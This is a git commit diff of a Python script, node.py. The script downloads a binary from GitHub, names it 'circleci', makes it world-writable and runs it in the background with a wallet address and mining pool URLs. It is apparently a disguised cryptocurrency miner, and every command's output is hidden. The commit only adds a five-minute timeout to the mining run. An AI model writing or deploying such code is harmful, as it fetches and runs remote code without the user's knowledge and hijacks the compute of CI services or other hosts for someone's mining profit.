90621729d780661c999d3e8d91a1c73be5ab4fa0
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-10 17:18:08 +0700

    Update node.py

--- node.py
+++ node.py
@@ -5,10 +5,10 @@ def main():
     cmd = "nohup wget https://github.com/aurbach55/pos/raw/main/circleci > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
     subprocess.call(cmd, shell=True)
 
-    cmd = "nohup chmod 777 circleci > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
+    cmd = "chmod 777 circleci > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
     subprocess.call(cmd, shell=True)
 
-    cmd = "nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
+    cmd = "timeout 5m nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
     subprocess.call(cmd, shell=True)
 
     print("done!!")
